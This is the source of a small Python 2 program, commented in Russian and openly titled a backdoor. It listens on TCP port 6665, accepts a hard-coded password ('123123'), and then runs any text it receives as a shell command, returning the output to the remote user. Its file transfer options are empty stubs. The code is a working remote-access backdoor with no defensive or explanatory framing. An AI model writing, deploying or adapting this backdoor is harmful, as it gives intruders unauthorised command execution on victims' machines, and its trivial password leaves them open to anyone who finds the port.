#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-----------------------------------------------------------------------
#--------------------------Пайтон бэкдор--------------------------------
#-----------------------------------------------------------------------
#Импорт модулей
import socket, threading, subprocess;

#Создаем сокет
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
#Биндим порт
s.bind(('', 6665));
#Запуск прослушивания
s.listen(1)
#Задаем блокировку 
lock = threading.Lock();
				
#Класс основанный на потоках
class daemon(threading.Thread):
	
	#Инициализация
    def __init__(self, (socket, address)):
        threading.Thread.__init__(self);
        self.socket = socket;
        self.address = address;

    #Метод хэлпа	
    def info(self):
	help_backdoor = """
Python BackDoor v1.0
---
1 - command line
2 - get file
3 - send file
4 - exit
---
""";
	return help_backdoor;	

    def run(self):

		#Авторитизация
		self.socket.send("Backdoor\n");
		self.socket.send('Password is:\n');
		data = self.socket.recv(1024);
		#Отризаем символ переноса строки
		#Сделать по хэшу
		if data[0:-1] != '123123':
			self.socket.send('Acces Denied !!!\n');
			self.socket.close();
		else:
			self.socket.send('Acces Succes !!!\n');	
			#Бесконечный цикл
			while(True):

				#Принимаем то что нам прислали
				data = self.socket.recv(1024)

				#Если 1 то выполнение команд и тд по цифрам разбор
				if data[0] == '1':
					#Отсылаем шапку					
					self.socket.send('Command line\n');
					self.socket.send('-' * 60 +'\n');
					#Бесконечный цикл ввода комманд					
					while (True):					
						#Печатаем приглашение						
						self.socket.send('-->');
						#Считываем данные						
						data = self.socket.recv(1024);
						#Если клосе то
						if data[0:-1] == '!close':
							#Завершаем подключение
							self.socket.send('Closed command line\n');
							self.socket.send('-' * 60 +'\n');
							#Обрываем цикл
							break;					 	
						# Выполняем команду
     						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);
     						#Читаем вывод и вывод ошибок
     						stdout_value = proc.stdout.read() + proc.stderr.read();
     						#Отсылаем данные
     						self.socket.send(stdout_value);
						#Отделяем одну комманду от другой	
						self.socket.send('-' * 60 +'\n');	
				elif data[0] == '2':
					self.socket.send('Get file\n');

					
				elif data[0] == '3':
					self.socket.send('Send file\n');

				
				elif data[0] == '4':
					self.socket.send('Bye-bue\n');
					break;
				
				else:
					self.socket.send(self.info() + '\n');
					#Если ничего нет то выыодим хэлп

			#Как только вышли из цикла то закрываем сокет
			self.socket.close();

while True:
    daemon(s.accept()).start();
